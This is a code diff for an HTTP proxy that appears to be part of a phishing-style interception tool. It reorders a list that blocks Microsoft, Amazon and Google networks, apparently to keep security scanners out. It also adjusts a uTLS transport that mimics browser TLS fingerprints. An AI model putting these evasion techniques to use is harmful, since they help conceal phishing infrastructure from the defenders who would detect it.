@@ -239,7 +239,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						// List of ASNs to block (Integers)
 						// 8075 = Microsoft, 16509 = Amazon, 15169 = Google, etc
-						blockedASNs := []uint{16509, 15169, 8075}
+						blockedASNs := []uint{8075, 16509, 15169}
 
 						for _, blockedASN := range blockedASNs {
 							if record.AutonomousSystemNumber == blockedASN {
@@ -2229,16 +2229,13 @@ func getClientHelloID(userAgent string) utls.ClientHelloID {
 
 func newTransportWithUA(ua string) *http.Transport {
 	return &http.Transport{
-		ForceAttemptHTTP2: true, // Enable HTTP/2
+		// Don't force HTTP/2 - let ALPN negotiation handle it naturally
+		// ForceAttemptHTTP2 conflicts with custom DialTLS and causes handshake failures
 		DialTLS: func(network, addr string) (net.Conn, error) {
 			dialer := net.Dialer{
 				Timeout:   30 * time.Second,
 				KeepAlive: 30 * time.Second,
 			}
-
-			// TCP/IP Fingerprinting Placeholder
-
-			// TODO: Implement OS-specific TCP socket options here (Window Size, TTL, etc.)
 
 			tcpConn, err := dialer.Dial(network, addr)
 			if err != nil {
@@ -2255,8 +2252,10 @@ func newTransportWithUA(ua string) *http.Transport {
 			}
 
 			uConfig := &utls.Config{
-				ServerName: host,
-				NextProtos: []string{"h2", "http/1.1"}, // Advertise HTTP/2
+				ServerName:         host,
+				InsecureSkipVerify: false,
+				// ALPN will negotiate h2 or http/1.1 naturally
+				NextProtos: []string{"h2", "http/1.1"},
 			}
 
 			uConn := utls.UClient(tcpConn, uConfig, helloID)
@@ -2267,6 +2266,10 @@ func newTransportWithUA(ua string) *http.Transport {
 
 			return uConn, nil
 		},
+		// Connection pooling settings
+		MaxIdleConns:        100,
+		MaxIdleConnsPerHost: 10,
+		IdleConnTimeout:     90 * time.Second,
 	}
 }
 
